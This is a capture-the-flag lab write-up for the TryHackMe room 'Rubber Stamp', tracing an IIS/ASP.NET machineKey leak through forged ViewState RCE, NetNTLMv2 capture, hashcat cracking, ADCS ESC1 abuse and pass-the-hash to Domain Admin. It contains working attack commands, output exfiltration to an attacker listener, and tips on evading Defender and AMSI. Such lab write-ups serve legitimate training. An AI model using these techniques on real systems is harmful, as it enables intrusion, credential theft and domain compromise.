# Rubber Stamp (TryHackMe)

Room: Rubber Stamp — "From IIS to Domain Admin." A seemingly minor ASP.NET info leak chained into
full domain compromise. Completed: 2026-11-09 | Target: <ip> (`RubberStamp`,
`SRV01.rubberstamp.local` — the IIS web server **is** the DC). Solved **headless from `C:\CTF`** with
`curl`, pure-Python ViewState forging, `badsecrets`, `hashcat`, `certipy`, and `impacket` — no
AttackBox, no Defender-flagged tooling on disk (ysoserial.net was quarantined, so the ViewState was
forged by hand).

## Flags

| Flag | Value |
|---|---|
| User (as `svc-iisweb`) | `THM{…}` |
| Root (Domain Admin) | `THM{…}` |

## Attack chain (one line)

`global.asax.bak` leak → `?debug=true` dumps the `machineKey` → forged encrypted+signed **ViewState
deserialization RCE** as `svc-iisweb` (user flag) → **NetNTLMv2 captured over HTTP + cracked** →
**ADCS ESC1** (certipy) → Administrator cert → PKINIT → NT hash → PtH → root flag.

## 1. Recon

DC with IIS on 80 (ASP.NET MVC 5.2 "Rubberstamp"). Open: 53/88/135/139/389/445/464/593/636/3268/
3269/3389/5985/9389. The homepage links a **legacy WebForms page** `/legacy/RequestStatus.aspx?id=N`
(loads a request by integer id — int-parsed, **no SQLi**) carrying an **encrypted** `__VIEWSTATE`
(`__VIEWSTATEGENERATOR=0CA456E0`). Null SMB + anon LDAP give the domain (`rubberstamp.local`) but no
user objects.

## 2. The minor flaw → machineKey leak

A `common.txt` content brute (the first run was cut off by a timeout — rerun to completion) found
**`/global.asax.bak`** (served because web.config maps `.bak`→`text/plain`) and `/certsrv` (ADCS).
`global.asax.bak` reveals a debug backdoor in `Application_Error`:

```csharp
if (context.Request.Path.StartsWith("/legacy/") && context.Request.QueryString["debug"] == "true") {
    ... Response.Write(... "validationKey=" + mk.ValidationKey + "decryptionKey=" + mk.DecryptionKey ...);
}
```

So any `/legacy/` path that **errors** with `?debug=true` dumps the `machineKey`:

```bash
curl "http://IP/legacy/RequestStatus.aspx?id=abc&debug=true"
# validationKey=<redacted-secret>  decryptionKey=<redacted-secret>  validation=SHA1
```

## 3. ViewState deserialization RCE (user flag)

With the machineKey, a malicious `__VIEWSTATE` → `unserialize` → RCE. **ysoserial.net is
Defender-quarantined and I'm not admin**, so I forged the ViewState in pure Python:

- **Verify first:** `badsecrets` (`ASPNET_Viewstate.viewstate_validate` / `viewstate_decrypt`) confirmed
  the leaked keys against a live ViewState → mode `DOTNET45`, HMAC-`SHA1`, `AES`, KDF specific-purposes
  `['TemplateSourceDirectory: /LEGACY', 'Type: LEGACY_REQUESTSTATUS_ASPX']`.
- **Gadget:** hand-built the `TextFormattingRunProperties` BinaryFormatter record (XAML →
  `ObjectDataProvider` → `Process.Start("cmd","/c …")`), wrapped as LosFormatter (`\xff\x01\x32`+len).
- **Protect:** SP800-108 KDF (reused badsecrets' `sp800_108_derivekey`) to derive the AES enc key +
  HMAC-SHA1 MAC key from the master keys + purposes, then `IV ∥ AES-CBC(PKCS7) ∥ HMAC-SHA1`, base64.
  A self-check round-tripped the forged blob back through badsecrets before sending.

POST it as `__VIEWSTATE` (+`__VIEWSTATEGENERATOR=0CA456E0`). The `ResourceDictionary→Brush` cast error
is *after* the command runs. `exec` output isn't reflected, so commands redirect to a temp file and
`curl` POST it back to my listener (target reaches me at `<ip>`). RCE as
**`rubberstamp\svc-iisweb`**; user flag at `C:\Users\Public\user.txt`.

`forge_viewstate.py` builds the payload; `run_cmd.py`/the listener give a command→output loop.

## 4. svc-iisweb → credentials (NetNTLMv2 capture + crack)

No `SeImpersonate` (no Potato); 445 occupied on my host (no SMB relay/capture); the apppool has no
loaded profile so `certreq` can't create a key container; PowerShell cert cmdlets tripped AMSI. So I
captured NetNTLMv2 **over HTTP** (`ntlm_capture.py`, a minimal NTLM-challenge HTTP server on 8890 with
fixed challenge `1122334455667788`) and coerced auth via the RCE:

```powershell
iwr -useb http://<ip>:8890/ -UseDefaultCredentials
```

```bash
hashcat -m 5600 svc.hash rockyou.txt -r rules/best64.rule   # -> svc-iisweb : <redacted-pw>
```

## 5. ADCS ESC1 → Domain Admin (root flag)

With creds, `certipy find -vulnerable` flagged **ESC8** (web enrollment over HTTP) and a custom
template **`PrivClientAuth`** vulnerable to **ESC1** (EnrolleeSuppliesSubject + Client Auth EKU, Domain
Users can enroll). ESC1 is the clean path — request a cert as Administrator:

```bash
certipy req -u 'svc-iisweb@rubberstamp.local' -p '<redacted-pw>' -dc-ip <ip> -ns <ip> \
   -ca 'rubberstamp-SRV01-CA' -template 'PrivClientAuth' -upn 'administrator@rubberstamp.local'
certipy auth -pfx administrator.pfx -dc-ip <ip>
# -> Got TGT; NT hash for administrator: <redacted-hash>
```

Pass-the-hash as Administrator → root flag:

```bash
wmiexec.py -hashes :<redacted-hash> rubberstamp.local/administrator@<ip> \
   "cmd /c type C:\Users\Administrator\Desktop\root.txt"
# -> THM{…}
```

## Lessons

- **A backup extension beats the config handler.** IIS blocks `web.config`, but the dev left
  `global.asax.bak` *and* mapped `.bak`→`text/plain`, so the source (and its debug backdoor) was a
  plain GET. Always brute for `.bak`/`~`/source copies, and run the wordlist to completion.
- **"Debug" conveniences are backdoors.** A `?debug=true` branch printing the `machineKey` turns an
  encrypted ViewState (normally un-forgeable) into trivial RCE. The machineKey is the crown jewel of
  an ASP.NET app.
- **You don't need ysoserial.net.** When the tool is blocked/quarantined, the .NET 4.5 ViewState
  format is reproducible in Python: verify the keys against a captured ViewState with `badsecrets`
  (which hands you the mode + KDF purposes + algos), reuse its `sp800_108_derivekey`, template a
  `TextFormattingRunProperties` gadget, and self-check the forged blob before firing.
- **Capture NetNTLMv2 over HTTP when 445 is taken.** A tiny NTLM-challenge HTTP server +
  `iwr -UseDefaultCredentials` (driven from the RCE) yields a crackable hash without touching SMB —
  and `rockyou + best64` cracked `<redacted-pw>`.
- **ESC1 is the quiet DA button.** A single custom template (`PrivClientAuth`) with
  EnrolleeSuppliesSubject + Client Auth EKU + Domain Users enrollment = any user → Administrator cert →
  PKINIT → NT hash → PtH. `certipy find -vulnerable` names it in one shot; manual `certutil` template
  enumeration missed it (it wasn't in the CA's published list but was enrollable).
- **Headless pattern** (cf. [[injectics]], the AD rooms): `curl` for the web stage, a Python
  command→callback loop over the ViewState RCE, then `certipy`/`impacket`/`hashcat` from `C:\CTF`.
  Everything that Defender flags (ysoserial, mimikatz, Rubeus) was avoided by forging/capturing in
  Python and pivoting with certipy's PKINIT (no on-disk offensive binaries).
```
